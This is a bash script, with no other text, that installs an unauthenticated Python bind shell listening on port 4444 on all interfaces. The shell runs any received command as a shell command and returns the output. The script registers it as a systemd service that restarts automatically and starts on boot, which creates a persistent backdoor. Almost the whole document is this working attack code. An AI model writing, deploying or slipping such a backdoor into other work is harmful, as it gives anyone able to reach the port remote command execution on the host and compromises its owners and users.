#!/bin/bash

# Install bind shell Python script
sudo echo "#!/usr/bin/env python3
import socket
import subprocess

def main():
    # Change the IP address and port as needed
    bind_ip = \"0.0.0.0\"
    bind_port = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, bind_port))
    server.listen(5)

    print(f\"[*] Listening on {bind_ip}:{bind_port}\")

    while True:
        client, addr = server.accept()
        print(f\"[*] Accepted connection from {addr[0]}:{addr[1]}\")
        data = client.recv(1024).decode()
        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        client.sendall(output)
        client.close()

if __name__ == \"__main__\":
    main()" | sudo tee /usr/local/bin/bind_shell.py

# Make the script executable
sudo chmod +x /usr/local/bin/bind_shell.py

# Create systemd service file
echo "[Unit]
Description=Bind Shell Service
After=network.target

[Service]
ExecStart=/usr/local/bin/bind_shell.py
Restart=always

[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/bind-shell.service

# Reload systemd daemon
sudo systemctl daemon-reload

# Start the bind shell service
sudo systemctl start bind-shell

# Enable the bind shell service to start on boot
sudo systemctl enable bind-shell

# Display service status
sudo systemctl status bind-shell
